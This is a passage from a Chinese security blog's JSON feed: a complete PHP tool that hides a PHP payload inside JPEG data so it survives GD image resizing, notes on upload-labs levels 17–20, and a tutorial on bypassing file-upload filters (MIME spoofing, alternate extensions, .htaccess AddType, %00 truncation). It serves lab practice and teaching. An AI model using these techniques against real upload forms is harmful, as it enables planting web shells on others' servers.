class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>    <span class=\"hljs-comment\">/*</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class=\"hljs-comment\">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    1) Upload an arbitrary image via secured files upload script</span><br><span class=\"hljs-comment\">    2) Save the processed image and launch:</span><br><span class=\"hljs-comment\">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class=\"hljs-comment\">    1) After the second processing the injected data may become partially corrupted.</span><br><span class=\"hljs-comment\">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class=\"hljs-comment\">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    Sergey Bobrov <span class=\"hljs-doctag\">@Black</span>2Fan.</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    See also:</span><br><span class=\"hljs-comment\">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class=\"hljs-comment\"></span><br><span class=\"hljs-comment\">    */</span><br><br>    <span class=\"hljs-variable\">$miniPayload</span> = <span class=\"hljs-string\">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class=\"hljs-keyword\">if</span>(!extension_loaded(<span class=\"hljs-string\">&#x27;gd&#x27;</span>) || !function_exists(<span class=\"hljs-string\">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>])) &#123;<br>        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    set_error_handler(<span class=\"hljs-string\">&quot;custom_error_handler&quot;</span>);<br><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$pad</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$pad</span> &lt; <span class=\"hljs-number\">1024</span>; <span class=\"hljs-variable\">$pad</span>++) &#123;<br>        <span class=\"hljs-variable\">$nullbytePayloadSize</span> = <span class=\"hljs-variable\">$pad</span>;<br>        <span class=\"hljs-variable\">$dis</span> = <span class=\"hljs-keyword\">new</span> DataInputStream(<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>]);<br>        <span class=\"hljs-variable\">$outStream</span> = file_get_contents(<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>]);<br>        <span class=\"hljs-variable\">$extraBytes</span> = <span class=\"hljs-number\">0</span>;<br>        <span class=\"hljs-variable\">$correctImage</span> = <span class=\"hljs-literal\">TRUE</span>;<br><br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$dis</span>-&gt;readShort() != <span class=\"hljs-number\">0xFFD8</span>) &#123;<br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">while</span>((!<span class=\"hljs-variable\">$dis</span>-&gt;eof()) &amp;&amp; (<span class=\"hljs-variable\">$dis</span>-&gt;readByte() == <span class=\"hljs-number\">0xFF</span>)) &#123;<br>            <span class=\"hljs-variable\">$marker</span> = <span class=\"hljs-variable\">$dis</span>-&gt;readByte();<br>            <span class=\"hljs-variable\">$size</span> = <span class=\"hljs-variable\">$dis</span>-&gt;readShort() - <span class=\"hljs-number\">2</span>;<br>            <span class=\"hljs-variable\">$dis</span>-&gt;skip(<span class=\"hljs-variable\">$size</span>);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$marker</span> === <span class=\"hljs-number\">0xDA</span>) &#123;<br>                <span class=\"hljs-variable\">$startPos</span> = <span class=\"hljs-variable\">$dis</span>-&gt;seek();<br>                <span class=\"hljs-variable\">$outStreamTmp</span> = <br>                    substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-variable\">$startPos</span>) . <br>                    <span class=\"hljs-variable\">$miniPayload</span> . <br>                    str_repeat(<span class=\"hljs-string\">&quot;\\0&quot;</span>,<span class=\"hljs-variable\">$nullbytePayloadSize</span>) . <br>                    substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-variable\">$startPos</span>);<br>                checkImage(<span class=\"hljs-string\">&#x27;_&#x27;</span>.<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>], <span class=\"hljs-variable\">$outStreamTmp</span>, <span class=\"hljs-literal\">TRUE</span>);<br>                <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$extraBytes</span> !== <span class=\"hljs-number\">0</span>) &#123;<br>                    <span class=\"hljs-keyword\">while</span>((!<span class=\"hljs-variable\">$dis</span>-&gt;eof())) &#123;<br>                        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$dis</span>-&gt;readByte() === <span class=\"hljs-number\">0xFF</span>) &#123;<br>                            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$dis</span>-&gt;readByte !== <span class=\"hljs-number\">0x00</span>) &#123;<br>                                <span class=\"hljs-keyword\">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class=\"hljs-variable\">$stopPos</span> = <span class=\"hljs-variable\">$dis</span>-&gt;seek() - <span class=\"hljs-number\">2</span>;<br>                    <span class=\"hljs-variable\">$imageStreamSize</span> = <span class=\"hljs-variable\">$stopPos</span> - <span class=\"hljs-variable\">$startPos</span>;<br>                    <span class=\"hljs-variable\">$outStream</span> = <br>                        substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-variable\">$startPos</span>) . <br>                        <span class=\"hljs-variable\">$miniPayload</span> . <br>                        substr(<br>                            str_repeat(<span class=\"hljs-string\">&quot;\\0&quot;</span>,<span class=\"hljs-variable\">$nullbytePayloadSize</span>).<br>                                substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-variable\">$startPos</span>, <span class=\"hljs-variable\">$imageStreamSize</span>),<br>                            <span class=\"hljs-number\">0</span>,<br>                            <span class=\"hljs-variable\">$nullbytePayloadSize</span>+<span class=\"hljs-variable\">$imageStreamSize</span>-<span class=\"hljs-variable\">$extraBytes</span>) . <br>                                substr(<span class=\"hljs-variable\">$outStream</span>, <span class=\"hljs-variable\">$stopPos</span>);<br>                &#125; <span class=\"hljs-keyword\">elseif</span>(<span class=\"hljs-variable\">$correctImage</span>) &#123;<br>                    <span class=\"hljs-variable\">$outStream</span> = <span class=\"hljs-variable\">$outStreamTmp</span>;<br>                &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                    <span class=\"hljs-keyword\">break</span>;<br>                &#125;<br>                <span class=\"hljs-keyword\">if</span>(checkImage(<span class=\"hljs-string\">&#x27;payload_&#x27;</span>.<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>], <span class=\"hljs-variable\">$outStream</span>)) &#123;<br>                    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Success!&#x27;</span>);<br>                &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                    <span class=\"hljs-keyword\">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    unlink(<span class=\"hljs-string\">&#x27;payload_&#x27;</span>.<span class=\"hljs-variable\">$argv</span>[<span class=\"hljs-number\">1</span>]);<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;Something\\&#x27;s wrong&#x27;</span>);<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">checkImage</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$filename</span>, <span class=\"hljs-variable\">$data</span>, <span class=\"hljs-variable\">$unlink</span> = <span class=\"hljs-literal\">FALSE</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">global</span> <span class=\"hljs-variable\">$correctImage</span>;<br>        file_put_contents(<span class=\"hljs-variable\">$filename</span>, <span class=\"hljs-variable\">$data</span>);<br>        <span class=\"hljs-variable\">$correctImage</span> = <span class=\"hljs-literal\">TRUE</span>;<br>        imagecreatefromjpeg(<span class=\"hljs-variable\">$filename</span>);<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$unlink</span>)<br>            unlink(<span class=\"hljs-variable\">$filename</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$correctImage</span>;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">custom_error_handler</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$errno</span>, <span class=\"hljs-variable\">$errstr</span>, <span class=\"hljs-variable\">$errfile</span>, <span class=\"hljs-variable\">$errline</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">global</span> <span class=\"hljs-variable\">$extraBytes</span>, <span class=\"hljs-variable\">$correctImage</span>;<br>        <span class=\"hljs-variable\">$correctImage</span> = <span class=\"hljs-literal\">FALSE</span>;<br>        <span class=\"hljs-keyword\">if</span>(preg_match(<span class=\"hljs-string\">&#x27;/(\\d+) extraneous bytes before marker/&#x27;</span>, <span class=\"hljs-variable\">$errstr</span>, <span class=\"hljs-variable\">$m</span>)) &#123;<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$m</span>[<span class=\"hljs-number\">1</span>])) &#123;<br>                <span class=\"hljs-variable\">$extraBytes</span> = (<span class=\"hljs-keyword\">int</span>)<span class=\"hljs-variable\">$m</span>[<span class=\"hljs-number\">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">DataInputStream</span> </span>&#123;<br>        <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$binData</span>;<br>        <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$order</span>;<br>        <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$size</span>;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$filename</span>, <span class=\"hljs-variable\">$order</span> = <span class=\"hljs-literal\">false</span>, <span class=\"hljs-variable\">$fromString</span> = <span class=\"hljs-literal\">false</span></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = <span class=\"hljs-string\">&#x27;&#x27;</span>;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;order = <span class=\"hljs-variable\">$order</span>;<br>            <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$fromString</span>) &#123;<br>                <span class=\"hljs-keyword\">if</span>(!file_exists(<span class=\"hljs-variable\">$filename</span>) || !is_file(<span class=\"hljs-variable\">$filename</span>))<br>                    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;File not exists [&#x27;</span>.<span class=\"hljs-variable\">$filename</span>.<span class=\"hljs-string\">&#x27;]&#x27;</span>);<br>                <span class=\"hljs-keyword\">$this</span>-&gt;binData = file_get_contents(<span class=\"hljs-variable\">$filename</span>);<br>            &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                <span class=\"hljs-keyword\">$this</span>-&gt;binData = <span class=\"hljs-variable\">$filename</span>;<br>            &#125;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;size = strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">seek</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-keyword\">$this</span>-&gt;size - strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">skip</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$skip</span></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-variable\">$skip</span>);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">readByte</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;eof()) &#123;<br>                <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class=\"hljs-variable\">$byte</span> = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>);<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">1</span>);<br>            <span class=\"hljs-keyword\">return</span> ord(<span class=\"hljs-variable\">$byte</span>);<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">readShort</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">if</span>(strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData) &lt; <span class=\"hljs-number\">2</span>) &#123;<br>                <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class=\"hljs-variable\">$short</span> = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">2</span>);<br>            <span class=\"hljs-keyword\">$this</span>-&gt;binData = substr(<span class=\"hljs-keyword\">$this</span>-&gt;binData, <span class=\"hljs-number\">2</span>);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;order) &#123;<br>                <span class=\"hljs-variable\">$short</span> = (ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">1</span>]) &lt;&lt; <span class=\"hljs-number\">8</span>) + ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">0</span>]);<br>            &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                <span class=\"hljs-variable\">$short</span> = (ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">0</span>]) &lt;&lt; <span class=\"hljs-number\">8</span>) + ord(<span class=\"hljs-variable\">$short</span>[<span class=\"hljs-number\">1</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$short</span>;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eof</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">return</span> !<span class=\"hljs-keyword\">$this</span>-&gt;binData||(strlen(<span class=\"hljs-keyword\">$this</span>-&gt;binData) === <span class=\"hljs-number\">0</span>);<br>        &#125;<br>    &#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"Less-17\"><a href=\"#Less-17\" class=\"headerlink\" title=\"Less-17\"></a>Less-17</h1><p>这一关考察条件竞争，看源码发现是先保存然后再判断是否需要删除，也就是可以一边不断发包上传，一边不断请求执行。上传一个执行就会额外生成木马的木马，抓住判断是否需要删除的一小段时间来发起请求，达到目的。我跑了一万次才有一次访问成功，还是要靠运气。。。。</p>\n<h1 id=\"Less-18\"><a href=\"#Less-18\" class=\"headerlink\" title=\"Less-18\"></a>Less-18</h1><p>同样也是条件竞争</p>\n<h1 id=\"Less-19\"><a href=\"#Less-19\" class=\"headerlink\" title=\"Less-19\"></a>Less-19</h1><p>WP说是可以%00截断1.php%00.jpg或者保存名为1.php/.    但是我发现好像可以大小写绕过？试了一下成功了嘻嘻嘻</p>\n<h1 id=\"Less-20\"><a href=\"#Less-20\" class=\"headerlink\" title=\"Less-20\"></a>Less-20</h1><p>审计代码，1.检查MIME类型 2. 检查文件名，如果是字符串，就直接通过.打散然后取出后缀，因此可以通过上传数组绕过处理，然后上传一个数量为三的数组，最后一个元素放jpg，第一个元素是1.php，中间的元素为空，这样绕过判断最后一个元素是不是jpg，同时拼接出来的文件名是<code>1.php.</code>，达到效果。</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/09/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "url": "http://blog.m1n.me/2019/09/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "title": "文件上传漏洞",
            "date_published": "2019-09-10T09:01:12.000Z",
            "content_html": "<h2 id=\"文件上传漏洞简介\"><a href=\"#文件上传漏洞简介\" class=\"headerlink\" title=\"文件上传漏洞简介\"></a>文件上传漏洞简介</h2><p>文件上传漏洞是web安全中经常遇到的一种漏洞形式，文件上传漏洞就是利用可以上传文件的地方将恶意代码或文件植入到服务器中，再通过URL去访问来执行代码，但是经常会遇到各种限制和过滤，因此就要学会各种姿势来绕过。</p>\n<span id=\"more\"></span>\n<h2 id=\"常见的限制以及绕过\"><a href=\"#常见的限制以及绕过\" class=\"headerlink\" title=\"常见的限制以及绕过\"></a>常见的限制以及绕过</h2><h3 id=\"客户端验证（前端验证\"><a href=\"#客户端验证（前端验证\" class=\"headerlink\" title=\"客户端验证（前端验证)\"></a>客户端验证（前端验证)</h3><h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>就是通过前端代码来检查用户所上传的文件的扩展名，对于攻击者来说是极其容易绕过的，因此更多是用于防止用户错误上传文件类型的措施。</p>\n<h4 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h4><ol>\n<li>先上传一个.gif或者.JPG之类的木马，突破前端验证后再通过抓包修改文件后缀名来实现绕过</li>\n<li>通过禁用或者删除JS来实现突破<h3 id=\"服务端验证\"><a href=\"#服务端验证\" class=\"headerlink\" title=\"服务端验证\"></a>服务端验证</h3><h4 id=\"MIME类型检测\"><a href=\"#MIME类型检测\" class=\"headerlink\" title=\"MIME类型检测\"></a>MIME类型检测</h4><h5 id=\"原理-1\"><a href=\"#原理-1\" class=\"headerlink\" title=\"原理\"></a>原理</h5>服务端通过检测MIME来限制文件上传的类型，其代码可能如下：<br><code>$_FILES[&#39;flie&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;</code><h5 id=\"绕过-1\"><a href=\"#绕过-1\" class=\"headerlink\" title=\"绕过\"></a>绕过</h5>通过抓包修改Content-Type<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.jpg\" alt=\"1.png\"><h4 id=\"检查文件内容\"><a href=\"#检查文件内容\" class=\"headerlink\" title=\"检查文件内容\"></a>检查文件内容</h4><h5 id=\"原理-2\"><a href=\"#原理-2\" class=\"headerlink\" title=\"原理\"></a>原理</h5>检查文件内容是否包含“&lt;? ”、“&lt;?= ”之类的关键字<h5 id=\"绕过-2\"><a href=\"#绕过-2\" class=\"headerlink\" title=\"绕过\"></a>绕过</h5>可以使用短tag绕过，例如<br><code>&lt;script language=&#39;pHp&#39;&gt;phpinfo();&lt;/script&gt;</code><h4 id=\"检查文件名\"><a href=\"#检查文件名\" class=\"headerlink\" title=\"检查文件名\"></a>检查文件名</h4><h5 id=\"原理-3\"><a href=\"#原理-3\" class=\"headerlink\" title=\"原理\"></a>原理</h5>检查文件名是否包含.php<h5 id=\"绕过-3\"><a href=\"#绕过-3\" class=\"headerlink\" title=\"绕过\"></a>绕过</h5></li>\n<li>大小写绕过，如.PhP</li>\n<li>使用其他可能被APache解析的后缀，如（.php4/.php5/.php7/.pht/.phtml）</li>\n<li>在Apache环境下上传.htaccess文件使其它后缀也被解析为php脚本执行。.htaccess文件内容为：<br><code>AddType application/x-http-php .jpg </code></li>\n<li>%00截断，操作方法：上传shell.jpg，Burp抓包，将文件名改为shell.php%00.jpg，选中%00，进行url-decode。</li>\n</ol>\n",
            "tags": []
        }
    ]
}